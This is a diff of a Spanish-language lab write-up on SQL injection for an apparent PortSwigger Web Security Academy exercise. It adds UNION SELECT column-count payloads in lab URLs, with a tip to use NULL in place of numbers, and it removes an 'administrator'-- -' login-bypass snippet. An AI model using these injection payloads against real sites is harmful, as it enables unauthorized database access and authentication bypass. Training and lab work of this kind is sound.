@@ -22,7 +22,15 @@ Ahora hay que buscar la manera de Fuzzear y contar.
 
 ![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/a91df05f-15d9-4d60-a5c0-dc72550d5486)
 
+Esto se vería algo así:
 
+![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/0af7cb7d-db50-4ae9-8462-f7cb35c71ac2)
+
+OJO! port swigger no acepta numeros por eso marca error:
+
+![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/bb3ee3ea-2a12-4443-ae86-867df5e71359)
+
+PAra hacerlo funcionar se necesita poner NULL
 
 
 ## Solución:
@@ -45,15 +53,16 @@ https://0aff002b034894bd8089e9e3001100a0.web-security-academy.net/filter?categor
 https://0aff002b034894bd8089e9e3001100a0.web-security-academy.net/filter?category=Lifestyle'  Union Select 1,2,3 -- -
 ````
 
-````sql
-administrator'-- -
+Utilizo NULL en lugar de números
+
 ````
-````http
-Username: administrator'-- -
-Password: Lo que sea...
+https://0aff002b034894bd8089e9e3001100a0.web-security-academy.net/filter?category=Lifestyle'  UNION SELECT NULL,NULL,NULL -- -
 ````
 
-![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/95856f02-84de-4067-a9af-65183b9bb6a9)
+![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/600fb155-e0c3-437c-96f9-e04ba315f31f)
+
+
+
 
 
 
